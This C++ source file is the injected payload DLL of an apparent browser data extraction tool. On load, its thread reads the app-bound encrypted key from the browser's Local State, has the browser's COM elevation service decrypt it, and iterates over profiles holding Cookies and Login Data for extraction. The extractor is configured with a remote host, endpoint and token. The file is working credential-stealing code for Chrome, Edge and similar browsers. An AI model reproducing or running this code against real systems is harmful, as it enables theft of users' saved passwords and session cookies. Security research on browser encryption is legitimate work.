// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "../core/common.hpp"
#include "../sys/bootstrap.hpp"
#include "../sys/internal_api.hpp"
#include "pipe_client.hpp"
#include "browser_config.hpp"
#include "data_extractor.hpp"
#include "../com/elevator.hpp"
#include "../crypto/key_derivation.hpp"
#include <fstream>

using namespace Payload;

struct ThreadParams {
    HMODULE hModule;
    LPVOID lpPipeName;
};

static std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localState, const std::string& keyName) {
    std::ifstream f(localState, std::ios::binary);
    if (!f) return {};

    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
    std::string tag = "\"" + keyName + "\":\"";
    size_t pos = content.find(tag);
    if (pos == std::string::npos) return {};
    pos += tag.length();
    size_t end = content.find('"', pos);
    if (end == std::string::npos) return {};

    std::string b64 = content.substr(pos, end - pos);
    DWORD size = 0;
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
    if (size < 5) return {};

    std::vector<uint8_t> data(size);
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr);
    return std::vector<uint8_t>(data.begin() + 4, data.end());
}

DWORD WINAPI PayloadThread(LPVOID lpParam) {
    auto params = std::unique_ptr<ThreadParams>(static_cast<ThreadParams*>(lpParam));
    LPCWSTR pipeName = static_cast<LPCWSTR>(params->lpPipeName);
    HMODULE hModule = params->hModule;

    {
        PipeClient pipe(pipeName);
        if (!pipe.IsValid()) {
            FreeLibraryAndExitThread(hModule, 0);
            return 1;
        }

        try {
            auto config = pipe.ReadConfig();
            auto browser = GetConfigs().at(config.browserType);

            Sys::InitApi(false);

            auto encKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "app_bound_encrypted_key");
            if (encKey.empty()) {
                FreeLibraryAndExitThread(hModule, 0);
                return 0;
            }

            std::vector<uint8_t> masterKey;
            try {
                Com::Elevator elevator;
                masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.iid_v2, browser.name == "Edge", browser.name == "Avast");
            } catch (...) {
                FreeLibraryAndExitThread(hModule, 0);
                return 0;
            }

            if (masterKey.empty()) {
                FreeLibraryAndExitThread(hModule, 0);
                return 0;
            }

            auto ep = Crypto::RuntimeKeyProvider::GetEndpoint();
            DataExtractor extractor(pipe, masterKey, ep.host, ep.endpoint, ep.token, true);

            for (const auto& entry : std::filesystem::directory_iterator(browser.userDataPath)) {
                try {
                    if (entry.is_directory() &&
                        (std::filesystem::exists(entry.path() / "Network" / "Cookies") ||
                         std::filesystem::exists(entry.path() / "Login Data"))) {
                        extractor.ProcessProfile(entry.path(), browser.name);
                    }
                } catch (...) {}
            }

        } catch (...) {}
    }

    FreeLibraryAndExitThread(hModule, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        auto params = new ThreadParams{hModule, lpReserved};
        HANDLE hThread = CreateThread(NULL, 0, PayloadThread, params, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
